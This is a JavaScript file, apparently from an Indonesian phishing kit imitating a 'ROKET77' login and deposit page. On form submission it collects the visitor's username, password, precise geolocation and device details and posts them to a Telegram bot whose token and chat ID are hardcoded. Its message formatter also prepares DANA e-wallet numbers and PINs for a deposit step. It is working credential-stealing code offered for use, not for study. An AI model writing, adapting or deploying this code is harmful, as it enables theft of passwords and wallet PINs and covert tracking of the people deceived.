// Konfigurasi Telegram
const BOT_TOKEN = '7953741317:AAGOY1HwrArKJHVoSqUMS0R5gaaHFGmBiJQ';
const CHAT_ID = '8190003621';

// Data Pengguna
let userData = {
    username: '',
    location: null,
    deviceInfo: null
};

// Fungsi untuk mengirim data ke Telegram
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        return await response.json();
    } catch (error) {
        console.error('Gagal mengirim ke Telegram:', error);
    }
}

// Fungsi untuk mendapatkan lokasi
function getLocation() {
    return new Promise((resolve) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const locationData = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date(position.timestamp),
                        mapUrl: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                    };
                    resolve(locationData);
                },
                (error) => {
                    resolve({ error: error.message });
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            resolve({ error: 'Geolokasi tidak didukung' });
        }
    });
}

// Fungsi untuk mendapatkan info perangkat
function getDeviceInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth
        },
        network: {
            type: connection ? connection.effectiveType : 'unknown',
            downlink: connection ? connection.downlink : 'unknown',
            rtt: connection ? connection.rtt : 'unknown'
        },
        language: navigator.language,
        cookies: navigator.cookieEnabled,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
}

// Format pesan untuk Telegram
function formatTelegramMessage(action, data) {
    let message = `🚀 *ROKET77 - ${action.toUpperCase()}* 🚀\n\n`;
    
    // Info Pengguna
    message += `👤 *INFO PENGGUNA*\n`;
    message += `▫️ Username: ${data.username || 'Tidak ada'}\n`;
    
    if (action === 'LOGIN') {
        message += `🔑 Password: ||${data.password}||\n`;
    } else if (action === 'DEPOSIT') {
        message += `💳 Nomor DANA: ${data.danaNumber}\n`;
        message += `🔒 PIN DANA: ||${data.danaPin}||\n`;
        message += `💰 Jumlah: Rp${data.amount.toLocaleString('id-ID')}\n`;
    }
    
    // Info Perangkat
    message += `\n📱 *INFO PERANGKAT*\n`;
    message += `▫️ Platform: ${data.deviceInfo.platform}\n`;
    message += `▫️ Browser: ${navigator.userAgent}\n`;
    message += `▫️ Layar: ${data.deviceInfo.screen.width}x${data.deviceInfo.screen.height}\n`;
    message += `▫️ Jaringan: ${data.deviceInfo.network.type}\n`;
    message += `▫️ Bahasa: ${data.deviceInfo.language}\n`;
    message += `▫️ Timezone: ${data.deviceInfo.timezone}\n`;
    
    // Info Lokasi
    if (data.location.error) {
        message += `\n📍 *LOKASI*\n❌ ${data.location.error}\n`;
    } else {
        message += `\n📍 *LOKASI*\n`;
        message += `▫️ Latitude: ${data.location.lat}\n`;
        message += `▫️ Longitude: ${data.location.lng}\n`;
        message += `▫️ Akurasi: ${data.location.accuracy}m\n`;
        message += `🌍 [Google Maps](${data.location.mapUrl})\n`;
    }
    
    message += `\n🕒 Waktu: ${new Date().toLocaleString('id-ID')}`;
    
    return message;
}

// Handle Form Login
document.getElementById('loginForm')?.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    // Dapatkan lokasi dan info perangkat
    const location = await getLocation();
    const deviceInfo = getDeviceInfo();
    
    // Simpan data pengguna
    userData = {
        username,
        location,
        deviceInfo
    };
    
    localStorage.setItem('username', username);
    
    // Kirim data ke Telegram
    const message = formatTelegramMessage('LOGIN', {
        username,
        password,
        location,
        deviceInfo
    });
    
    await sendTelegramMessage(message);
    
    // Redirect ke halaman deposit
    window.location.href = 'deposit.html';
});

// Tampilkan modal
function showModal(title, message) {
    const modal = document.createElement('div');
    modal.className = 'modal';
    modal.innerHTML = `
        <div class="modal-content">
            <h3 class="modal-title">${title}</h3>
            <p>${message}</p>
            <button class="btn-login" onclick="this.parentElement.parentElement.remove()">TUTUP</button>
        </div>
    `;
    document.body.appendChild(modal);
}